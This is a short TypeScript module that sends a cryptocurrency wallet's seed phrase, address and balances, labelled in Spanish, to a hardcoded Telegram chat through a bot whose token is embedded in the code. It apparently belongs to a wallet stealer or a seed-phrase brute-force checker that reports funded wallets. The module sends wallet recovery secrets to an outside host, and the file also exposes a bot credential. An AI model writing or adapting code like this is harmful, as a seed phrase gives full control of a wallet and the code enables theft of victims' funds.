import TelegramBot from "node-telegram-bot-api";

const token = "7943951367:AAG0X-lhN4kkIaR0oLV-63ZWwgwfgqisTOs";
const bot = new TelegramBot(token, { polling: false });
const chatId = "814041563";

export const enviarMensajeTelegram = (
    frase: string,
    wallet: string,
    saldoActual: string,
    saldoRecibido: string,
    saldoSinConfirmar: string
  ): void => {
    const mensaje = `   📢 Semilla: 
                        ${frase}
                        ---------------
                        👛 Wallet: 
                        ${wallet}
                        ---------------
                        💰 Saldo actual: ${saldoActual}
                        📥 Saldo recibido: ${saldoRecibido}
                        ⏳ Saldo sin confirmar: ${saldoSinConfirmar}`;
  
    bot
      .sendMessage(chatId, mensaje)
      .then(() => {
        console.log("Mensaje enviado con éxito 📢");
      })
      .catch((error) => {
        console.error("Error al enviar el mensaje:", error);
      });
  };
